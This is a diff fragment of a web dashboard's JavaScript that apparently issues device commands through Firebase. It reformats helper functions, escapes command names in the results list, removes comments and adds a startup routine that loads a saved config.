+        if (state === 'writing') el.className = 'value yellow';
+        else if (state === 'ready') { el.textContent = 'Ready'; el.className = 'value green'; }
+        else el.className = 'value red';
+    }
+
     function updateCmdResult(id, status, output) {
         const found = state.results.find(r => r.id === id);
-        if (found) { 
-            found.status = status; 
-            found.output = output; 
+        if (found) {
+            found.status = status;
+            found.output = output;
         }
         renderCmdResults();
         const lastStatusEl = document.getElementById('cmdLastStatus');
@@ -1304,7 +1227,7 @@
             const statusClass = r.status;
             const canRetry = r.status === 'write_fail' || r.status === 'error';
             return '<div class="result-item"><div class="ri-top">' +
-                '<span class="ri-action">' + (r.name || r.action) + '</span>' +
+                '<span class="ri-action">' + escapeHtml(r.name || r.action) + '</span>' +
                 '<span class="ri-status ' + statusClass + '">' + statusClass + '</span>' +
                 '<span class="ri-time">' + r.time + '</span>' +
                 (canRetry ? '<button class="retry-btn" onclick="retryCmd(\'' + r.id + '\')">↻ Retry</button>' : '') +
@@ -1323,10 +1246,8 @@
     function retryCmd(id) {
         const found = state.results.find(r => r.id === id);
         if (!found) return;
-        // Remove this result and re-execute
         state.results = state.results.filter(r => r.id !== id);
         renderCmdResults();
-        // Find the original command from COMMANDS and re-execute
         for (const cat of Object.values(COMMANDS)) {
             const match = cat.find(c => c.action === found.action && c.name === found.name);
             if (match) {
@@ -1334,7 +1255,6 @@
                 return;
             }
         }
-        // Fallback: reconstruct
         executeCmd({ name: found.name, action: found.action, params: found.params || {} }, found.params || {});
     }
 
@@ -1373,7 +1293,6 @@
         toast('Config saved. Reloading…', 'info');
         setTimeout(() => location.reload(), 500);
     }
-    document.getElementById('settingsModal').addEventListener('click', function(e) { if (e.target === this) closeSettings(); });
 
     // ═══════════════════════════════════════════════════════
     //  UTILITY
@@ -1384,9 +1303,34 @@
         el.className = 'toast ' + (type || 'info');
         el.textContent = msg;
         c.appendChild(el);
-        setTimeout(() => { el.style.opacity = '0'; el.style.transform = 'translateX(20px)'; el.style.transition = 'all 0.3s'; setTimeout(() => el.remove(), 300); }, 4000);
+        setTimeout(() => {
+            el.style.opacity = '0';
+            el.style.transform = 'translateX(20px)';
+            el.style.transition = 'all 0.3s';
+            setTimeout(() => el.remove(), 300);
+        }, 4000);
     }
-    function escapeHtml(s) { if (!s) return ''; const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+    function escapeHtml(s) {
+        if (!s) return '';
+        const d = document.createElement('div');
+        d.textContent = s;
+        return d.innerHTML;
+    }
+
+    // ═══════════════════════════════════════════════════════
+    //  INIT
+    // ═══════════════════════════════════════════════════════
+    document.addEventListener('DOMContentLoaded', () => {
+        appendDiag('🚀 Dashboard loading…');
+        const savedCfg = localStorage.getItem('mc_firebase_config');
+        if (savedCfg) appendDiag('📁 Config found in localStorage');
+        else appendDiag('ℹ️ No saved config — using defaults or open ⚙️ Settings');
+
+        // Show the device control category by default on command view
+        renderCmdCategories('device');
+
+        initFirebase();
+    });
 </script>
 </body>
 </html>
